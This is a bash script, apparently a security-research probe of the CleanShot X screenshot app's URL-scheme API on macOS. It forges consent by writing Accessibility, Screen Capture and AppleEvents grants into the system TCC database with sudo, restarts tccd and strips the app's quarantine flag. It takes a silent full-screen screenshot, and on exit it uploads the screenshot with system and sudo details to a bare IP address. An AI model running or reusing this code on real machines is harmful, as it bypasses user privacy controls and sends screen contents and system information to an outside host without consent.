#!/bin/bash
# CleanShot X probe v14 — grant TCC via sqlite (SIP disabled), read UI via Accessibility, complete onboarding
OUT=/tmp/csx-report-v14.txt
: > "$OUT"
exec > >(tee -a "$OUT") 2>&1
set -x
set +e

DROP_URL="http://143.246.43.43:8080/csx-v14"
DOMAIN="pl.maketheweb.cleanshotx"
SUITE="AFJU4P8ZV4.pl.maketheweb.cleanshotx"
TARGET="/Applications/CleanShot X.app"
TCCDB="/Library/Application Support/com.apple.TCC/TCC.db"

finish() {
  echo "=== EXIT $? ==="
  curl -s --max-time 90 -X POST --data-binary @/tmp/csx-report-v14.txt "$DROP_URL" || true
}
trap finish EXIT

sw_vers; id; sudo -n true && echo SUDO_OK; csrutil status

echo "=== TCC INSERT ==="
grant() {
  SVC="$1"; CLI="$2"
  sudo sqlite3 "$TCCDB" "delete from access where service='$SVC' and client='$CLI';" 2>&1
  sudo sqlite3 "$TCCDB" "insert into access (service,client,client_type,auth_value,auth_reason,auth_version,indirect_object_identifier_type,indirect_object_identifier,flags,last_modified) values ('$SVC','$CLI',1,2,4,1,0,'UNUSED',0,strftime('%s','now'));" 2>&1
}
for C in /usr/bin/osascript /bin/bash /usr/sbin/screencapture /usr/bin/python3; do
  grant kTCCServiceAccessibility "$C"
  grant kTCCServiceScreenCapture "$C"
  grant kTCCServiceAppleEvents "$C"
done
sudo sqlite3 "$TCCDB" "select service,client,auth_value from access;" 2>&1 | head -30
sudo killall tccd 2>&1
sleep 2

DMG=/tmp/csx.dmg
curl -sSL --max-time 300 -o "$DMG" https://updates.getcleanshot.com/v3/CleanShot-X-5.0.2.dmg
hdiutil attach "$DMG" -nobrowse -noverify -readonly
MP=$(hdiutil info | awk -F'\t' '/\/Volumes\//{print $NF}' | tail -1)
sudo rm -rf "$TARGET"; sudo ditto "$MP/CleanShot X.app" "$TARGET"
sudo xattr -dr com.apple.quarantine "$TARGET" 2>&1
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f "$TARGET"
sleep 2
for D in "$DOMAIN" "$SUITE"; do
  defaults write "$D" allowURLSchemesAPI -bool true
  defaults write "$D" didAskAboutURLSchemesAPI -bool true
  defaults write "$D" _allowURLSchemes -bool true
done

open -a "$TARGET"
sleep 14
PID=$(pgrep -f "CleanShot X.app/Contents/MacOS" | head -1)
echo "PID=$PID"

echo "=== AX TEST ==="
osascript -e 'tell application "System Events" to get name of every process whose background only is false' 2>&1 | head -5

echo "=== WINDOW TITLES ==="
osascript -e 'tell application "System Events" to tell process "CleanShot X" to get name of every window' 2>&1 | head -10

echo "=== UI ELEMENTS ==="
osascript -e 'tell application "System Events" to tell process "CleanShot X" to get {name, role, description} of every UI element of window 1' 2>&1 | head -20

echo "=== SCREENSHOT ==="
sudo screencapture -x /tmp/shot.png 2>&1; ls -l /tmp/shot.png 2>&1
base64 -i /tmp/shot.png 2>/dev/null | head -c 300000
echo
echo "=== END SHOT ==="

python3 - <<'PY'
import struct,zlib
def png(path,color,w=64,h=64):
    raw=b''.join(b'\x00'+bytes(color)*w for _ in range(h))
    def ch(t,d):
        c=t+d
        return struct.pack('>I',len(d))+c+struct.pack('>I',zlib.crc32(c)&0xffffffff)
    open(path,'wb').write(b'\x89PNG\r\n\x1a\n'+ch(b'IHDR',struct.pack('>IIBBBBB',w,h,8,2,0,0,0))+ch(b'IDAT',zlib.compress(raw))+ch(b'IEND',b''))
png('/tmp/csx_canary.png',(0,0,255))
PY
chmod 644 /tmp/csx_canary.png

echo "=== SEND URL CMD ==="
open -a "$TARGET" "cleanshot://pin?filepath=/tmp/csx_canary.png"
sleep 6
osascript -e 'tell application "System Events" to tell process "CleanShot X" to get name of every window' 2>&1 | head -10

echo "=== DONE ==="
exit 0
